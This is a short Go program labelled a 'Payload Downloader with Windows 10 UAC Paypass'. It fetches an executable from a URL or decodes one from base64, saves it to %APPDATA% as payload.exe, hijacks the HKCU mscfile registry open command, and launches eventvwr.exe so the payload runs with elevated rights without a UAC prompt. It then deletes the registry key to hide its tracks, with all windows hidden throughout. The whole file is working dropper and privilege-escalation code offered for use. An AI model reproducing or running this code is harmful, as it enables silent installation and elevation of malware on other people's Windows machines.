//Payload Downloader with Windows 10 UAC Paypass
package main

import (
	"encoding/base64"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"unicode"
)

var fileURL string = `https://the.earth.li/~sgtatham/putty/latest/x86/putty.exe` //Leave nil if not using
var fileBase64 string = ``                                                       //Leave nil if not using
var tmpPath string = os.Getenv("APPDATA") + "\\"

func main() {
	if fileURL == "" {
		Binary, _ := os.Create(tmpPath + "payload.exe")
		DecodedBinary, _ := base64.StdEncoding.DecodeString(fileBase64)
		Binary.WriteString(string(DecodedBinary))
		Binary.Close()
	} else if fileBase64 == "" {
		output, _ := os.Create(tmpPath + "payload.exe")
		defer output.Close()
		response, _ := http.Get(fileURL)
		defer response.Body.Close()
		_, err := io.Copy(output, response.Body)
		if err != nil {
		}
	}
	cmd := exec.Command("cmd", "/Q", "/C", "reg", "add", "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command", "/d", tmpPath+"payload.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err := cmd.Output()
	if err != nil {
	}
	c := exec.Command("cmd", "/C", "eventvwr.exe")
	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := c.Run(); err != nil {
	}
	cmd = exec.Command("cmd", "/Q", "/C", "reg", "delete", "HKCU\\Software\\Classes\\mscfile", "/f")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
	}
}
